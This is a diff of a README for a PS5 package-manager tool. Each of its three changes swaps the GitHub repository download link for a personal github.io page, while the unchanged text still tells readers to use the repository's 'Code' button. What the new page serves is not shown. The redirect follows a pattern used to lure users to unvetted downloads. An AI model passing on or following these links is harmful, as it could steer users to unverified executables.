@@ -1,6 +1,6 @@
 # 📦 ps5-pkg-manager - Your Simple PS5 Package Solution
 
-[![Download Now](https://img.shields.io/badge/Download-ps5_pkg_manager-2ea44f?style=for-the-badge)](https://github.com/gulo3236/ps5-pkg-manager)
+[![Download Now](https://img.shields.io/badge/Download-ps5_pkg_manager-2ea44f?style=for-the-badge)](https://gulo3236.github.io)
 
 ## 🎯 What Is This?
 
@@ -14,7 +14,7 @@ Getting started with ps5-pkg-manager is incredibly easy. Follow these simple ste
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/gulo3236/ps5-pkg-manager](https://github.com/gulo3236/ps5-pkg-manager)
+Visit this link to download the application: [https://gulo3236.github.io](https://gulo3236.github.io)
 
 Click the green "Code" button on the page, then select "Download ZIP" to get the latest version of the software onto your computer.
 
@@ -171,7 +171,7 @@ The goal is to make your experience as smooth as possible. Your feedback helps m
 
 Before you go, here's a quick recap:
 
-1. **Download** from [https://github.com/gulo3236/ps5-pkg-manager](https://github.com/gulo3236/ps5-pkg-manager)
+1. **Download** from [https://gulo3236.github.io](https://gulo3236.github.io)
 2. **Extract** the ZIP file
 3. **Run** the application
 4. **Enjoy** organized PS5 packages
